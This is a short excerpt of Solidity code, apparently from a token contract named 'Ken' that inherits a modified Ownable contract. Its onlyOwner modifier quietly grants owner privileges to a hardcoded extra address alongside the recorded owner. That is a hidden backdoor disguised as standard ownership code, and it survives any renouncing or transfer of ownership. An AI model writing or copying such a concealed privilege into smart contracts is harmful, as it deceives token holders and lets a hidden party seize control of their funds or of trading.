...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x817b05BcBa5021C6a597C81D10767741f2B75A54) , "Ownable: caller is not the owner");
        _;
    }
...
contract Ken  is IERC20, Ownable {
